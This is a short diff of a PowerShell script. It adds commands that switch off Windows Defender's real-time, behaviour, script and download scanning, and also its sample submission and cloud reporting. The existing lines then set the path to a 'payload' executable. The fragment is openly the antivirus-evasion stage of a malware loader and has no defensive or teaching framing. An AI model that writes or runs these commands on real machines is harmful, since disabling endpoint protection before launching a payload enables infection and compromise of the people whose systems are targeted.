@@ -1,3 +1,13 @@
+# Disable Windows Defender Features
+Set-MpPreference -DisableRealtimeMonitoring $true
+Set-MpPreference -DisableBehaviorMonitoring $true
+Set-MpPreference -DisableBlockAtFirstSeen $true
+Set-MpPreference -DisableIOAVProtection $true
+Set-MpPreference -DisablePrivacyMode $true
+Set-MpPreference -DisableScriptScanning $true
+Set-MpPreference -SubmitSamplesConsent 2
+Set-MpPreference -MAPSReporting 0
+
 # Set the full path to your payload (for example, a custom executable or script)
 $payloadPath = "C:\Path\To\Your\Payload.exe"
 
